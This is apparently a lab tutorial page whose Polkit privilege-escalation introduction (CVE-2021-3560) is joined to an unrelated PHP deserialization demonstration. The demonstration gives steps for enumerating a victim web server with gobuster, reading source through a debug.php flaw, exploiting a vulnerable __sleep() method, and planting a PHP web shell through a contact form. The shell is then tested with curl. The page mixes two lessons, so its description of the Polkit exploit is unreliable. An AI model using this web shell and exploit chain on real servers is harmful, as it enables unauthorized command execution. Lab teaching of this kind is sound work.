---
title: "Polkit Privilege Escalation"
teaching: 3
exercises: 30
questions:
- "What is Polkit?"
- "How the Exploit Works"
objectives:
- "Understand the Role and Function of Polkit"
- "Identify the Vulnerability"
- "Recognize the Exploitation Process"
---


## What is Polkit?

Polkit is integral to numerous Linux distributions for managing system-wide permissions. The CVE-2021-3560 vulnerability exploits Polkit's functionality, enabling local users to escalate their privileges and achieve root access. This unauthorized elevation can lead to complete system control, enabling attackers to perform further malicious activities. The root cause of this vulnerability lies in a defect within Polkit’s authentication mechanism, which allows the bypassing of the authentication step needed for root access acquisition. Mitigation of this security flaw involves updating the operating system and ensuring that the Polkit version is updated beyond 0.118.

Originally known as PolicyKit, Polkit serves as an intermediary allowing various applications to communicate and execute processes via D-bus, a middleware that facilitates inter-process communication. It enables both privileged (sudo) and non-privileged processes to interact, providing a unified control interface for managing system-wide permissions. For instance, executing the ‘pkexec’ command in a Linux terminal typically triggers a graphical interface prompt for sudo authentication. Conversely, operating Polkit via command-line interfaces permits direct interaction without a graphical user interface.

## Details on How the Exploit Works

The attack is executed through the transmission of a sequence of meticulously constructed D-bus messages directed at Polkit, aimed at inducing a race condition. This condition erroneously issues an authorization message, circumventing the standard authentication procedure. Additionally, the assault leverages the XDG_RUNTIME_DIR environment variable, which delineates the location where Polkit archives its authentication-specific files and tokens. Unauthorized entry into this directory facilitates access to the system without authentication. The success of this exploit significantly depends on timing; therefore, multiple attempts and a rapid succession of requests are essential to increase the likelihood of a successful breach.

## What are the countermeasures?

1. Update and Patch Systems: Regularly update the operating system and all associated packages to ensure that the Polkit component is beyond the vulnerable versions. Specifically, ensure Polkit is updated to version 0.118 or higher, which addresses this specific vulnerability.

2. Monitor System Activity: Implement comprehensive monitoring of system activities, particularly focusing on authentication processes and system privilege escalations. Use intrusion detection systems (IDS) and log management solutions to detect and alert on unusual activities that could indicate an attempted exploitation of the Polkit vulnerability.

3. Restrict Access to Sensitive Directories: Limit access to critical system directories and environment variables, such as XDG_RUNTIME_DIR, which are known to be leveraged in the CVE-2021-3560 exploit. Employ filesystem permissions and access control lists (ACLs) to restrict unauthorized users from accessing or modifying these directories and files.

### Demonstration
1. We will start by first adding the Deserialization Attack application:

![add_app](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/16e609c9-5446-4c6c-b70a-c7885dff74d9)

2. Next, click the View link to go to the application-specific page and start the application containers:

![start](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/5d192067-3366-4c4e-ae9e-106f158a6288)

3. Open the victim terminal and type 'ifconfig' to check the IP address for victim server  

![victim terminal](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/33064a4c-5a86-4e51-bb3c-44a057f0f4e9)

![victim-ip](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/cf19b27a-1609-480e-bee0-5206a11fc098)

4. launch the hacker’s web interfaces in separate browser tabs by clicking the icon next to the deserialization:

![attacker-link](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f39fc9c6-f46f-4476-84e2-03a2ec342e02)

5. On the deserialization vm, open firefox browser, or install any browser you like. Enter http://victim_ip to the URL bar to access the VNC session

![attacker-victim-vnc](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f2223721-b7fd-4914-abb3-825c9de2ec30)

6. Try going through the website like a normal user, is there anywhere you can exploit, anything you can enter?

Then, on the deserialization vm. use the command gobuster -w /wordlist/wordlist_php -u http://victim_ip to list the directory and hidden file on the webserver. Feel free to try other web enumeration tools, and use different wordlist as well.

![gobuster-command-1](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/8b1e4422-43c3-426b-90aa-eaa4a78358cc)

7. After running the gobuster rto enumerate the hidden file on the webserver, you will find a new file called debug.php running on the website. To open debug.php, use the command http://victim_ip/debug.php

![webpage-debug](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/1bb997d9-f217-47a0-84de-007e821cc54e)

8. Now you have found the debug.php, it’s a mistake made by the developer. To access the
source code of debug.php, you can enter the URL: viewsource:http://<victim's IP address>/debug.php?read=debug.php to view the source code of the
debug.php.

![webpage-debug-2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/ad22bd72-e436-4949-8ff3-d512471af9f8)

9. In the source code of debug.php, there are two Get parameters you can manipulate. One is called read and the other is execute. read can let you check the source code of the websites and execute will allow you to execute file contain PHP source code

![gobuster-command-3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/45b13c9f-7732-4ad2-b2e0-ae1cebaef628)

10. When you run the gobuster tool, I am sure you have also found another php file called contact.php. contact.php is the file where the website will process the contact information entered by user, we can see the source code of this file by entering the URL: http://<victim's IP address>/debug.php?read=contact.php

![webpage-debug-3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/abff5019-6327-446b-b0fc-91bf59594dfb)

11. Upon reviewing the source code of contact.php file, what have you found? There is a critical vulnerability in the file, a deserialization vulnerability.

```
<?php
# Omitted some code

$new_customer = new customer;
$new_customer->name = $name;
$new_customer->email = $email;
$new_customer->comment = $comment;
$temp = serialize($new_customer);

# Omitted some code

class customer
{
   public $name;
   public $email;
   public $comment;
   public function __sleep()
   {
      // Write the content to file once the object is serialized
      $filename = $this->name . '_' . $this->email;
      file_put_contents("./user_info/$filename", $this-
>comment, FILE_USE_INCLUDE_PATH);
   }
}
?>
```

12. A closer look at the preceding code reveals that the vulnerability exists in the magic function __sleep() defined in the class customer. The logic in the function __sleep() shows that once an instance of class customer is serialized, it will write a file to a directory in the web root directory.

13. Now we know there is a vulnerability in the code, how do we use this vulnerability?
Recall earlier I asked you to find the parameter you can interact with on the website,
there is a webpage where you can enter user defined text. To navigate to this page, enter
the URL http://victim_ip/contact.html to access the page.

![attacker-victim-vnc2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/d97ddab3-76ae-43a0-853a-9f3a63b07f6b)

14. On this page, there are three parameters you can define: name, email, and comment. If you still remember the source code of the contact.php file, you can make an educated guess that the contact.php will handle the post request sent by contact.html form. If you want to verify that, you can also download burpsuites and verify. Or you can also examine the source code of the contact.html page to see where the POST request is sent to.

![demodiagram2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/08579174-32fa-4df9-bcfd-96bb608d5d2b)

15. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
entering all the text, click submit to plant the webshell

![demodiagram3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/47192691-5a79-4f79-88e7-0f2e0384e999)

16. On the attacker VM, use the command curl
http://victim_ip/user_info/test_user.php?cmd=whoami to test whether the planted
webshell is working or not.

![result](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f3c29b0e-0756-48ce-97bf-e5058091f85f)

17. A secure server is running on the Secure server's IP address, you are welcome to try attacking
it, but it does not have the deserialization vulnerability and misconfiguration present on
the victim VM.




